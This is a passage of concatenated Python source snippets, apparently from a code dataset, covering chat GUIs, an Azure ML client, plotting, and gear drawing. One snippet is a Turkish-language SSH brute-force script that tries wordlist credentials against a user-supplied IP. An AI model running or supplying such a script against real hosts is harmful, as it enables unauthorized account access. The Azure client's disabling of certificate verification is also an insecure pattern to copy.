self.log.error(f\"Kill hook for task '{self.name}' failed to execute within 5s...\")\n\n\n         finally:\n        ",
    "from paho.mqtt import publish, subscribe #COMM\r\nimport paho.mqtt.client as mqtt          #COMM\r\nfrom simpledt import JsonDataTable         #DF\r\nfrom datetime import datetime              #DF\r\nimport json; import sys; import os   #COMMANDS\r\nimport flet as flt                        #GUI\r\nimport pandas as pd                        #DF\r\nimport platform                         #CHECK\r\n\r\n# \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n# All old mqtt variables\r\n\r\nMQTT_TOPIC = 'pychat-vicourt' # To connect into the chat\r\nMQTT_BROKER = 'test.mosquitto.org' # The default connection\r\nMQTT_PORT = 1883 # Default port \r\n\r\n# \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n\r\ndef main(page= flt.Page):\r\n\r\n    page.title = \"PyChat \u2014 MQTT/Python/Json by VicourtBitt\"\r\n\r\n    # The window measurement\r\n    page.window_width = 580\r\n    page.window_min_width = 580\r\n    page.window_max_width = 580\r\n\r\n    page.window_height = 600\r\n    page.window_min_height = 600\r\n    page.window_max_height = 600\r\n    # The window measurement\r\n\r\n    page.scroll = 'auto'\r\n    page.horizontal_alignment = \"Center\"\r\n\r\n    # The distance between every window end(?)\r\n    page.padding = 5\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n    # ROWS AND COLUMNS \r\n\r\n    # First Screen Alignment\r\n    fs_column1 = flt.Column()\r\n    fs_row1 = flt.Row()\r\n    fs_row2 = flt.Row()\r\n    fs_row3 = flt.Row()\r\n\r\n    # Second Screen Alignment\r\n    ss_column1 = flt.Column()\r\n    ss_row1 = flt.Row()\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n    # BUTTONS, CONTAINERS, TXT FIELDS AND STUFF DECLARATION\r\n\r\n    # >>> FIRST SCREEN STUFF\r\n    fs_username = flt.TextField(\r\n            width=250,\r\n            height=100,\r\n            label= \"COMO QUER SER CHAMADO?\",\r\n            hint_text=\"N\u00e3o utilize apelidos.\"\r\n        )\r\n\r\n    fs_usertext = flt.ElevatedButton(\r\n            text= \"Escreva seu username na caixa de texto abaixo.\\n\\nRegras:\\nSem apelidos\\nSem abrevia\u00e7\u00f5es\",\r\n            width = 250, height= 180,\r\n            disabled= True,\r\n            style= flt.ButtonStyle(\r\n                shape={\r\n                    flt.MaterialState.DEFAULT: \r\n                            flt.BeveledRectangleBorder(radius=3)\r\n                    }\r\n                )\r\n        )\r\n    \r\n    # >>> SECOND SCREEN STUFF\r\n    json_path = 'C:\\\\Users\\\\victo\\\\Desktop\\\\Anota\u00e7\u00f5es Python\\\\pychat_log.txt'\r\n    json_dataframe = JsonDataTable(json_path)\r\n    json_datatable = json_dataframe.datatable\r\n\r\n    ss_datacontainer = flt.Container(\r\n        content= json_datatable,\r\n        width=560\r\n    )\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n    # ALIGNMENT APPEND\r\n\r\n    # >>> FIRST SCREEN APPEND\r\n    fs_row1.controls.append(fs_usertext)\r\n    fs_row2.controls.append(fs_username)\r\n\r\n    fs_list = [fs_row1,fs_row2] # this is basically all the stuff above\r\n    \r\n    for f in fs_list:\r\n        fs_column1.controls.append(f)\r\n\r\n    # >>> SECOND SCREEN APPEND\r\n    ss_row1.controls.append(ss_datacontainer)\r\n\r\n    ss_list = [ss_row1] # the same explanation could be used here\r\n\r\n    for s in ss_list:\r\n        ss_column1.controls.append(s)\r\n\r\n    # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n\r\n    def route_changer(route):\r\n\r\n        page.views.clear()\r\n\r\n        # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n        # This is the menu and username collect screen\r\n\r\n        page.views.append( # This page append means everything (including the view) we're adding into the screen\r\n            flt.View(\r\n                '/',\r\n                [\r\n                    flt.AppBar(\r\n                        # All the page settings\r\n                        title= flt.Text(\"Menu \u2014 Tela Inicial\"),\r\n                        center_title=True,\r\n                        toolbar_height=50,\r\n                        bgcolor=flt.colors.BLUE_900,\r\n                        actions=\r\n                        [\r\n                            # This is an icon, which, in the future, will send us into other screens\r\n                            flt.IconButton(flt.icons.HISTORY, on_click=lambda _: page.go('/page1'), icon_size=30),\r\n                            flt.IconButton(flt.icons.CHAT, on_click=lambda _: page.go('/page2'), icon_size=30)\r\n                            # That lambda inside the function, receive a dump arg, just to run properly the program\r\n                        ]\r\n                    ),\r\n                    fs_column1\r\n                ]\r\n            )\r\n        )\r\n        page.update() # This update is crucial.\r\n\r\n        # \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n        # This is the messages log screen\r\n\r\n        if page.route == '/page1':\r\n            page.views.append(\r\n                flt.View(\r\n                    '/page1',\r\n                    [\r\n                        flt.AppBar(\r\n                            title=flt.Text('Log de Mensagens'),\r\n",
    "import json\r\nimport os\r\n\r\nfrom modules import errors, scripts\r\n\r\nlocalizations = {}\r\n\r\n\r\ndef list_localizations(dirname):\r\n    localizations.clear()\r\n\r\n    for file in os.listdir(dirname):\r\n        fn, ext = os.path.splitext(file)\r\n        if ext.lower() != \".json\":\r\n            continue\r\n\r\n        localizations[fn] = [os.path.join(dirname, file)]\r\n\r\n    for file in scripts.list_scripts(\"localizations\", \".json\"):\r\n        fn, ext = os.path.splitext(file.filename)\r\n        if fn not in localizations:\r\n            localizations[fn] = []\r\n        localizations[fn].append(file.path)\r\n\r\n\r\ndef localization_js(current_localization_name: str) -> str:\r\n    fns = localizations.get(current_localization_name, None)\r\n    data = {}\r\n    if fns is not None:\r\n        for fn in fns:\r\n            try:\r\n                with open(fn, \"r\", encoding=\"utf8\") as file:\r\n                    data.update(json.load(file))\r\n            except Exception:\r\n                errors.report(f\"Error loading localization from {fn}\", exc_info=True)\r\n\r\n    return f\"window.localization = {json.dumps(data)}\"\r\n",
    "import urllib.request\nimport json\nimport os\nimport ssl\n\nfrom dotenv import load_dotenv\nload_dotenv()\n\n# for connecting off-proxy\n# os.environ['https_proxy'] = ''\n# os.environ['http_proxy'] = ''\n# os.environ['no_proxy'] = ''\n# os.environ['HTTPS_PROXY'] = ''\n# os.environ['HTTP_PROXY'] = ''\n# os.environ['NO_PROXY'] = ''\n\ndef allowSelfSignedHttps(allowed):\n    # bypass the server certificate verification on client side\n    if allowed and not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None):\n        ssl._create_default_https_context = ssl._create_unverified_context\n\nallowSelfSignedHttps(True) # this line is needed if you use self-signed certificate in your scoring service.\n\n# Request data goes here\n# The example below assumes JSON formatting which may be updated\n# depending on the format your endpoint expects.\n# More information can be found here:\n# https://docs.microsoft.com/azure/machine-learning/how-to-deploy-advanced-entry-script\ndata = {\"chat_history\": [{\"inputs\": {\"question\": \"Who is Albert Einstein?\"}, \"outputs\": {\"answer\": \"Albert Einstein was a sicentist.'.\"}}], \"question\": \"summarize the conversatio above?\"}\ndata = {\"chat_history\": [{\"inputs\": {\"question\": \"Who is Albert Einstein?\"}, \"outputs\": {\"answer\": \"Albert Einstein was a sicentist.'.\"}}], \"question\": \"summarize the conversatio above?\"}\n\nbody = str.encode(json.dumps(data))\n\nurl = 'https://shahml-hhrub.eastus.inference.ml.azure.com/score'\n# Replace this with the primary/secondary key or AMLToken for the endpoint\napi_key = os.environ['AZURE_ENDPOINT']\nif not api_key:\n    raise Exception(\"A key should be provided to invoke the endpoint\")\n\n# The azureml-model-deployment header will force the request to go to a specific deployment.\n# Remove this header to have the request observe the endpoint traffic rules\nheaders = {'Content-Type':'application/json', 'Authorization':('Bearer '+ api_key), 'azureml-model-deployment': 'shahml-hhrub-1' }\n\nreq = urllib.request.Request(url, body, headers)\n\ntry:\n    response = urllib.request.urlopen(req)\n\n    result = response.read()\n    print(result)\nexcept urllib.error.HTTPError as error:\n    print(\"The request failed with status code: \" + str(error.code))\n\n    # Print the headers - they include the requert ID and the timestamp, which are useful for debugging the failure\n    print(error.info())\n    print(error.read().decode(\"utf8\", 'ignore'))",
    "from threading import Thread\nfrom ui import RcUI\nfrom model import ReCon\nfrom CTkMessagebox import CTkMessagebox\nimport webbrowser\nimport os\n\n\nclass App:\n    def __init__(self):\n        # read config\n        self.logic = None\n        self.ui = None\n        self.init_logic()\n        self.init_ui()\n\n    def init_logic(self):\n        # init model\n        self.logic = ReCon()\n        self.logic.bind(\"activity\", self.on_model_activity)\n        self.logic.bind(\"initialized\", self.on_model_initialize)\n        self.logic.bind(\"host_establishment\", self.on_model_host_establishment)\n        self.logic.bind(\"consoles_loaded\", self.on_model_consoles_loaded)\n        self.logic.bind(\"local_networks_loaded\", self.on_model_local_networks_loaded)\n        self.logic.bind(\"node_found\", self.on_model_node_found)\n        self.logic.bind(\"nodes_loaded\", self.on_model_nodes_loaded)\n        self.logic.bind(\"tunnel_established\", self.on_model_tunnel_established)\n        self.logic.bind(\"tunnel_closed\", self.on_model_tunnel_closed)\n\n    def init_ui(self):\n        # init ui\n        self.ui = RcUI(title=\"ReCon\")\n        self.ui.frames[\"login\"].cmbx_sshosts.configure(command=self.on_ui_cmbx_sshosts_change)\n        self.ui.frames[\"login\"].txt_password.bind(\"<KeyRelease>\", self.on_ui_txt_password_keyrelease)\n        self.ui.frames[\"login\"].btn_connect.configure(command=self.on_ui_btn_connect_click)\n        self.ui.frames[\"devices\"].btn_spawn_shell.configure(command=self.on_ui_btn_spawn_shell)\n        self.ui.frames[\"devices\"].btn_consoles_refresh.configure(command=self.on_ui_btn_consoles_refresh)\n        self.ui.frames[\"devices\"].btn_spawn_console.configure(command=self.on_ui_btn_spawn_console)\n        self.ui.frames[\"devices\"].btn_nics_refresh.configure(command=self.on_ui_btn_nics_refresh)\n        self.ui.frames[\"devices\"].btn_nodes_refresh.configure(command=self.on_ui_btn_nodes_refresh)\n        self.ui.frames[\"devices\"].btn_tunnel_https.configure(command=self.on_ui_btn_node_tunnel_https)\n\n    def start(self):\n        self.logic.start()\n        self.ui.start()  # doesn't return while UI running\n\n    # Event handlers\n    # app\n    def on_stop(self):\n        self.logic.stop()\n\n    # model\n    def on_model_initialize(self):\n        if len(self.logic.host_pool):\n            values = tuple(h for h in self.logic.host_pool)\n            self.ui.frames[\"login\"].cmbx_sshosts.configure(values=values)\n        if self.logic.current_host:\n            self.ui.frames[\"login\"].txt_username.insert(0, self.logic.current_host.username)\n            self.ui.frames[\"login\"].cmbx_sshosts.set(self.logic.current_host.address)\n        else:\n            self.ui.frames[\"login\"].txt_username.insert(0, os.getlogin())\n        self.ui.set_status(\"Ready!\")\n        self.ui.show(\"login\")\n\n    def on_model_activity(self, msg):\n        self.ui.set_status(msg)\n\n    def on_model_host_establishment(self, is_ok, error=None):\n        if is_ok:\n            self.ui.set_connection_info_at_title(self.logic.current_host.username, self.logic.current_host.address)\n            self.ui.set_status(\"Connection established!\")\n            self.ui.show(\"devices\")\n        else:\n            self.ui.set_status(f\"Can't connect! ({error})\", True)\n            self.ui.frames[\"login\"].set_accessibility(\"normal\")\n\n\n    def on_model_consoles_loaded(self, consoles):\n        self.ui.set_status(\"Consoles loaded.\")\n        self.ui.frames[\"devices\"].cmbx_consoles.configure(values=consoles)\n        self.ui.frames[\"devices\"].cmbx_consoles.set(consoles[0])\n        self.ui.frames[\"devices\"].btn_spawn_console.configure(state=\"normal\")\n        self.ui.frames[\"devices\"].btn_consoles_refresh.configure(state=\"normal\")\n\n    def on_model_local_networks_loaded(self, networks):\n        self.ui.set_status(\"Local networks loaded.\")\n        self.ui.frames[\"devices\"].cmbx_nics.configure(values=networks)\n        self.ui.frames[\"devices\"].cmbx_nics.set(networks[0])\n        self.ui.frames[\"devices\"].btn_nics_refresh.configure(state=\"normal\")\n        if not self.logic.current_host.nodes:\n            msg = CTkMessagebox(title=\"Proceed?\",\n                                message=\"No previously found nodes available. Selected network will be scanned.\"\n                                        \"Do you want to proceed?\",\n                                icon=\"question\", option_1=\"No\", option_2=\"Yes\")\n            if msg.get() == \"Yes\":\n                Thread(target=self.logic.enumerate_nodes).start()\n\n    def on_model_node_found(self, node):\n        self.ui.frames[\"devices\"].add_lbx_node(node)\n\n    def on_model_nodes_loaded(self):\n        self.ui.set_status(f\"Nodes loaded.\")\n        self.ui.frames[\"devices\"].btn_nodes_refresh.configure(state=\"normal\")\n        self.ui.frames[\"devices\"].btn_tunnel_https.configure(state=\"normal\")\n\n    def on_model_tunnel_established(self, port_mapping):\n        self.ui.frames[\"devices\"].extend_lbx_nodes(port_mapping, handler=self.on_ui_lbx_node_double_click)\n        self.ui.frames[\"devices\"].btn_tunnel_http",
    "# EXPERIMENTAL DATA PLOTTER\n\"\"\"\nThis code is used to plot the experimental data from the csv file.\nThe data is read from the csv file and the error angles are plotted.\nThe perturbation, motor noise, and target angle sequences are detected and plotted.\nThe plot is saved in the same directory as the csv file.\n\n\"\"\"\n\nfrom tkinter import *\n\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport pandas as pd\n\nimport GUI\n\n# Create a dialog window asking for the path to the csv file\n\ndialog_window = Tk()\nfilepath = GUI.reader_menu(dialog_window)\nprint(filepath)\n\n\n# Update this to your actual file path\n# filepath = '/Users/a1/Desktop/exp_data/motor_noise_test/motor_noise_test_2024_03_18_16_31_58/motor_noise/experimental_data.csv'\n\ndef read_data(file_path):\n    \"\"\"Returns the data and the data folder.\n    Args:\n        file_path: Path to the file containing the data\n    \"\"\"\n    # Read data from the specified file\n    data = pd.read_csv(file_path)\n    directory_path = '/'.join(file_path.split('/')[:-1])  # Get the directory path\n    return data, directory_path\n\n\ndef subject_id(directory_path):\n    \"\"\"Returns the subject ID from the directory path.\n    Args:\n        directory_path: The directory path\n    Returns:\n        subject_id: The subject ID\n    \"\"\"\n    subject_id = directory_path.split('/')[-2]  # Get the subject ID from the directory path\n    return subject_id\n\n\ndef script_name(directory_path):\n    \"\"\"Returns the script name from the directory path.\n    Args:\n        directory_path: The directory path\n    Returns:\n        script_name: The script name\n    \"\"\"\n    script_name = directory_path.split('/')[-1]  # Get the script name from the directory path\n    return script_name\n\n\ndef remove_outliers(data, critical_angle):\n    \"\"\" Function to remove outliers from the data.\n    Args:\n        data: The data to filter\n        critical_angle: The critical angle in degrees to filter out the outliers. By default, should be chosen as 100\n    Returns:\n        filtered_data: The filtered data\n        critical_idx: The indices of the critical angles\n    \"\"\"\n    angle = np.radians(critical_angle)\n    critical_idx = np.where(data.iloc[:, 1] > critical_angle)[0]\n    filtered_data = data[np.abs(data.iloc[:, 1]) < angle]\n    return filtered_data, critical_idx\n\n\ndef plot_error_angles():\n    \"\"\"\n    Function to plot error angles.\n    \"\"\"\n    ax1.plot(timeline, error_angles, 'bo-', alpha=0.75, label='error angles')\n\n\ndef convert_perurbation_mode(data):\n    \"\"\"Function to convert perturbation mode to numerical values.\n        Args: data: The data to convert\n        Returns: data: The data with the perturbation mode converted to numerical values\n    \"\"\"\n    pd.set_option('future.no_silent_downcasting', True)\n    data['perturbation_mode'] = data['perturbation_mode'].replace('False', 0)\n    data['perturbation_mode'] = data['perturbation_mode'].replace('sudden', 1)\n    data['perturbation_mode'] = data['perturbation_mode'].replace('gradual', 2)\n    data['perturbation_mode'] = data['perturbation_mode'].replace('random', 3)\n    return data\n\n\ndef convert_feedback_mode(data):\n    \"\"\"Function to convert feedback mode to numerical values.\n        Args: data: The data to convert\n        Returns: data: The data with the feedback mode converted to numerical values\n    \"\"\"\n    pd.set_option('future.no_silent_downcasting', True)\n\n    data['feedback'] = data['feedback'].replace('False', 0)\n    data['feedback'] = data['feedback'].replace('trajectory', 1)\n    data['feedback'] = data['feedback'].replace('end_pos', 2)\n    data['feedback'] = data['feedback'].replace('reinforcement', 3)\n    return data\n\n\ndef mode_boundaries(mode):\n    \"\"\" Function to identify the boundaries of perturbation, motor noise, target sequences in the data.\n    Args:\n        data['column_name']: The column to filter and analyze, e.g.:\n            data['perturbation_mode']: The perturbation sequence\n            data['motor_noise']: The motor noise sequence\n            data['sequence_target']: The target angle sequence\n    Returns: boundaries: 3-dimensional array with the boundaries of sequences and sequence parameter:\n        boundaries[:,0]: The start index of the sequence\n        boundaries[:,1]: The end index of the sequence\n        boundaries[:,2]: The sequence parameter: type of perturbation ('gradual', 'sudden', 'random'), motor noise level or\n        target angle\n    \"\"\"\n\n    column_name = mode  # Specify the mode (column) to filter and analyze\n\n    filtered_data = data[data[column_name] != 0]\n\n    filtered_attempts = filtered_data['attempts'].values  # attempts of corresponding mode\n    filtered_values = filtered_data[column_name].values  # values of corresponding mode\n\n    # Calculate differences in attempts and values to identify changes\n    difference_in_attempts = np.diff(filtered_attempts) - 1\n    difference_in_values = np.diff(filtered_values)\n\n    # Initialize boundaries array\n    boundaries = np.zeros((0, 3), dtype=object)\n\n    # If there are differences in attemp",
    "import socket  \nfrom colorama import Fore  \nimport paramiko  \nimport threading  \n\nip = input(\"Hedef \u0130p Giriniz : \")\nport = 22\n\ndef port_tara(ip, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1.25)\n        s.connect((ip, port))\n        print(Fore.GREEN + \"{} [\u221a] portu a\u00e7\u0131k. L\u00fctfen Bekleyin...\".format(port))\n        s.close()\n    except socket.error:\n        print(Fore.RED + \"{} [\u00d7] portu kapal\u0131. Tool'dan \u00e7\u0131k\u0131l\u0131yor...\".format(port))\n        exit()\n        \n        \nusernamelist = input(\"SSH kullan\u0131c\u0131 ad\u0131 wordlistini giriniz: \")\npasswordlist = input(\"SSH \u015fifre wordlistini giriniz: \")\n\ndef ssh_brute():\n    ssh = paramiko.SSHClient()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    with open(usernamelist, 'r') as users:\n        with open(passwordlist, 'r') as passwords:\n            for username in users:\n                username = username.strip() \n                for password in passwords:\n                    password = password.strip()\n                    try:\n                        ssh.connect(hostname=ip, port=port, username=username, password=password)\n                        print(Fore.GREEN + \"[\u2713] Ba\u015far\u0131l\u0131. \u015eifre ve Kullan\u0131c\u0131 ad\u0131 Bulundu \", \"Kullan\u0131c\u0131 Ad\u0131:\", username, \"\u015eifre:\", password)\n                        ssh.close()\n                        return\n                    except paramiko.AuthenticationException:\n                        print(Fore.RED + \"[\u00d7] Ba\u015far\u0131s\u0131z Kullan\u0131c\u0131 ad\u0131 ve \u015eifre Bulunamad\u0131\")\n                    except paramiko.SSHException as e:\n                        print(Fore.RED + f\"[\u00d7] SSH ba\u011flant\u0131 hatas\u0131: {e}\")\n                        \n                        \nport_tara(ip, port)\nstart = therading.Thread(target=ssh_brute)\nstart.start()\n                  \n",
    "import streamlit as st\nfrom judini.codegpt import CodeGPTPlus\nfrom dotenv import load_dotenv\nimport os\nimport time\nload_dotenv()\n\n\n# connect with codegpt\napi_key= os.getenv('CODEGPT_API_KEY')\nagent_id= os.getenv('CODEGPT_AGENT_ID')\norg_id= os.getenv('ORG_ID')\n\nst.set_page_config(layout=\"centered\")\n\nst.title(\"Agent FAQ\")\nst.markdown(\"---\")\n\n# init chat\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\n# Display chat\nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"]):\n        st.markdown(message[\"content\"])\n\n# User input\nif prompt := st.chat_input(\"How can I help you?\"):\n    # user message history\n    st.session_state.messages.append({\"role\":\"user\", \"content\": prompt})\n\n    with st.chat_message(\"user\"):\n        st.markdown(prompt)\n\n    with st.chat_message(\"assistant\"):\n        with st.spinner(\"Thinking...\"):\n            message_placeholder = st.empty()\n            full_response = \"\"\n\n\n            # connect CodeGPT SDK\n            codegpt = CodeGPTPlus(api_key=api_key, org_id=org_id)\n            messages = st.session_state.messages\n\n            response_completion = codegpt.chat_completion(agent_id=agent_id, messages=messages, stream=True)\n\n            for response in response_completion:\n                time.sleep(0.05)\n                full_response += (response or \"\")\n                message_placeholder.markdown(full_response + \"|\")\n\n            message_placeholder.markdown(full_response)\n    \n    st.session_state.messages.append({\"role\":\"assistant\", \"content\": full_response})\n\n\n\n",
    "#main.py\r\nimport ezdxf\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\n#\u53ef\u8a2d\u5b9a\u53c3\u6578\r\n\r\n\r\nwhile(1):\r\n    try:\r\n        m=float(input('\u8acb\u8f38\u5165\u6a21\u6578(\u55ae\u4f4d:mm)Please enter gear module(unit:mm):'))#\u6a21\u6578\r\n        break\r\n    except:\r\n        print('\u4f60\u8f38\u5165\u7684\u662f\u975e\u6578\u5b57\uff0c\u8acb\u91cd\u65b0\u8f38\u5165.Not int ,please again')\r\nwhile(1):\r\n    try:\r\n        tn=int(input('\u8acb\u8f38\u5165\u9f52\u6578(\u6574\u6578)Please enter the number of gear teeth:'))#\u9f52\u6578\r\n        break\r\n    except:\r\n        print('\u4f60\u8f38\u5165\u7684\u662f\u975e\u6574\u6578\uff0c\u8acb\u91cd\u65b0\u8f38\u5165Not int ,please again')\r\nwhile(1):\r\n    try :\r\n        alpha = float(input('\u8acb\u8f38\u5165\u58d3\u529b\u89d2(\u89d2\u5ea6)(\u53ea\u80fd\u8f38\u5165:14.5,20,25)Please enter the pressure angle (angle) (14.5, 20, 25 only):'))#\u58d3\u529b\u89d2\r\n        if alpha==14.5 or alpha==20 or alpha==25 :break\r\n        else:print(\"\u53ea\u80fd\u8f38\u516514.5,20,25\u90193\u7a2e\u58d3\u529b\u89d2 14.5, 20, 25 only\")\r\n    except :\r\n        print(\"\u53ea\u80fd\u8f38\u516514.5,20,25\u90193\u7a2e\u58d3\u529b\u89d2 14.5, 20, 25 only\")\r\n\r\nwhile(1):\r\n    try :\r\n        d=float(input('\u8acb\u8f38\u5165\u8ef8\u5f91 Please enter shaft diameter:'))#\u8ef8\u76f4\u5f91\r\n        break\r\n    except :\r\n        print('\u4f60\u8f38\u5165\u7684\u662f\u975e\u6574\u6578\uff0c\u8acb\u91cd\u65b0\u8f38\u5165Not int ,please again')\r\n###\r\nDp=tn*m#\u7bc0\u5713\r\nrp=Dp/2\r\nDb=Dp*np.cos(alpha*np.pi/180)#\u57fa\u5713\r\nrb=Db/2\r\nDa=Dp+2*m#\u9f52\u9802\u5713\u76f4\u5f91\r\nra=Da/2\r\nDf=Dp-2.5*m#\u9f52\u5e95\u5713\u76f4\u5f91\r\nrf=Df/2\r\n#\u756b\u57fa\u5713\r\ntheta = np.linspace(0, 2 * np.pi, 100)\r\nDbX = rb * np.cos(theta)\r\nDbY = rb * np.sin(theta)\r\n#\u756b\u7bc0\u5713\r\nDpX = rp * np.cos(theta)\r\nDpY = rp * np.sin(theta)\r\n#\u756b\u9f52\u9802\u5713\r\nDaX = ra * np.cos(theta)\r\nDaY = ra * np.sin(theta)\r\n#\u756b\u8ef8\r\ndx = d/2 * np.cos(theta)\r\ndy = d/2 * np.sin(theta)\r\nx=[]\r\ny=[]\r\n\r\n#\u756b\u6f38\u958b\u7dda\r\nfinal_a=np.degrees(np.arccos(rb/ra))#\u6f38\u958b\u7dda\u7d42\u9ede\r\nfinal_t=ra*np.sin(final_a/180*np.pi)/rb*180/np.pi#\u6f38\u958b\u7dda\u7d42\u9ede\r\n# print('final_a=',final_a)\r\n# print('final_t=',final_t)\r\njump=True\r\nif rf>=rb:#\u5982\u679c\u9f52\u5e95\u5713\u534a\u5f91>\u57fa\u5713\u534a\u5f91#\u6f38\u958b\u7dda\u5f9e\u9f52\u6839\u958b\u59cb\u756b#Ver.1.01\r\n    begin_a=np.degrees(np.arccos(rb/rf))\r\n    t=rf*np.sin(begin_a/180.0*np.pi)/rb*180.0/np.pi\r\n    xyPoints=[]\r\nelse:\r\n    t=0\r\n    #\u756b\u9f52\u6839\r\n    x.append(rf)\r\n    y.append(0)\r\n    xyPoints=[(rf,0)]\r\nwhile(jump):\r\n    if t>=final_t:\r\n        t=final_t\r\n        jump=False\r\n    cbArc=rb*t*np.pi/180.0#\u5f27\u9577\r\n    a=np.degrees(np.arctan(cbArc/rb))\r\n    inva=(t-a)*np.pi/180.0#\u6f38\u958b\u7dda\u51fd\u6578\r\n    xc=(rb/np.cos(a*np.pi/180.0)) * np.cos(inva)#\u6f38\u958b\u7dda\u516c\u5f0f\r\n    yc=(rb/np.cos(a*np.pi/180.0)) * np.sin(inva)#\u6f38\u958b\u7dda\u516c\u5f0f\r\n    x.append(xc)\r\n    y.append(yc)\r\n    xyPoints.append((xc,yc))\r\n    t+=1#t\u70ba\u6f38\u958b\u7dda\u756b\u7dda\u7684\u7cbe\u5ea6\uff0c+1\u4ee3\u8868\u6bcf\u4e00\u5ea6\u756b\u4e00\u9ede\uff0c\u8b8a\u5316\u91cf\u8d8a\u5c0f\u8d8a\u6e96\r\n#\u93e1\u5c04\r\nM=np.array([[1,0],\r\n           [0,-1]],)\r\nmirCx=[]\r\nmirCy=[]\r\nfor i in range(len(x)):\r\n    xm,ym,=M.dot([x[i],y[i]])\r\n    mirCx.append(xm)\r\n    mirCy.append(ym)\r\n#\u65cb\u8f49\r\nrpa=np.degrees(np.arccos(rb/rp))\r\nrpt=rp*np.sin(rpa/180*np.pi)/rb#\u9f52\u578b\u548c\u7bc0\u5713\u4ea4\u63a5\u7684\u9ede\uff0c\u548c\u5713\u5fc3\u7684\u593e\u89d2\r\n# print('rpa=',rpa)\r\n# print('rpt=',rpt)\r\ntheta=(rpt-rpa/180*np.pi)*2 + np.pi/tn\r\nMr=np.array([[np.cos(theta),-np.sin(theta)],\r\n             [np.sin(theta), np.cos(theta)]],)\r\nxyPointsMir=[]##\r\nfor i in range(len(mirCx)):\r\n    ii=len(mirCx)-i-1#\u5012\u8005\u8d70\r\n    xm,ym,=Mr.dot([mirCx[ii],mirCy[ii]])\r\n    x.append(xm)\r\n    y.append(ym)\r\n    xyPointsMir.append((xm,ym))\r\n#\u5c07\u9f52\u6839\u65cb\u8f49\u8907\u88fd\r\nxgear=[]\r\nygear=[]\r\nfor i in range(0,tn):\r\n    theta=np.pi/tn*i*2\r\n    Mr=np.array([[np.cos(theta),-np.sin(theta)],\r\n                 [np.sin(theta), np.cos(theta)]],)\r\n    for i in range(len(x)):\r\n        xm,ym,=Mr.dot([x[i],y[i]])\r\n        xgear.append(xm)\r\n        